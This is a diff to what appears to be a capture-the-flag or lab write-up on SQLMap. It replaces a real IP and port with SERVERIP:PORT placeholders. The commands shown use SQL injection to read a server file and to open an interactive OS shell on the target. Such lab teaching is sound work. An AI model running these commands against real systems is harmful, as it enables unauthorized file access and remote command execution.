@@ -241,11 +241,11 @@ We first check if we can read the Database
 
 The output returns `True` which means we can read and write in the Database.
 
-      sqlmap -u 'http://94.237.54.116:37269/?id=1'  -p 'id' --batch --file-read="/var/www/html/flag.txt"
+      sqlmap -u 'http://SERVERIP:PORT/?id=1'  -p 'id' --batch --file-read="/var/www/html/flag.txt"
 
 2.`Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.`
 
-      sqlmap -u 'http://94.237.54.116:37269/?id=1'  -p 'id' --batch --os-shell
+      sqlmap -u 'http://SERVERIP:PORT/?id=1'  -p 'id' --batch --os-shell
 
 
 
@@ -254,6 +254,8 @@ The output returns `True` which means we can read and write in the Database.
 Questions
 
 1.`What's the contents of table final_flag? `
+
+
 
 
 
